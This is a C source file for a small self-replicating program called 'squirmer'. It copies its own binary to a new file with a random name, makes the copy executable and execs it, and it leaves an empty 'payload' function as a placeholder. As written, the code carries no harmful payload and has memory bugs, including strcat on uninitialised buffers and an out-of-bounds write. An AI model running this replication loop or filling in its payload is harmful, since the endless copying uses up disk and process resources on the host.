#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <time.h>

int checkNewPath(char* np){
        FILE *chckptr;
        chckptr=fopen(np,"r");
        if(chckptr == NULL){return 0;}
	else{
	fclose(chckptr);
	return 1;
	}
	
}

char *randString(char *string, int length){
const char charset[65] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
	char str[length];
	for(int i = 0; i < length; ++i){
		str[i] = charset[rand() % (61)];
	}
	str[length] = '\0';
	strcat(string, str);
	return string;
}



void payload(char* offset){






}

int main(int argc, char* argv[]){

	char* data;
	char* sourcePath;
	char* newPath;
	data = (char*)malloc(20000);
        sourcePath = (char*)malloc(50);
        newPath = (char*)malloc(50);
	strcat(sourcePath, "/squirmer");
	strcat(newPath, "/squirmer1");
	
	char* offset = argv[0];
	
	if( checkNewPath(newPath) == 1 ){
		srand(time(0)+(int)offset);
		printf("exec");
		randString(newPath, 4);
	}

	FILE *rfptr;
	rfptr = fopen(sourcePath,"rb");
	if (rfptr == NULL){printf("fatal error while trying to read source file.\n");exit(1);}
	
	fseek(rfptr, 0, SEEK_END);
	long int size = ftell(rfptr);
	fseek(rfptr, 0, SEEK_SET);
	
	fread(data, size, 1, rfptr);
	fclose(rfptr);
	

        FILE *wfptr;
        wfptr = fopen(newPath,"wb");
        if (wfptr == NULL){printf("fatal error while trying to write file.\n");exit(1);}
	
        fseek(wfptr, 0, SEEK_SET);
	fwrite(data, size, 1, wfptr);
        fclose(wfptr);
	
	payload(offset);
	
	chmod(newPath, S_IRWXU|S_IXGRP|S_IROTH);

	free(sourcePath);
	free(data);

	offset+=1;
	execl(newPath, offset, NULL);
	printf("fail\n");

	free(newPath);

	
	return 0;
}
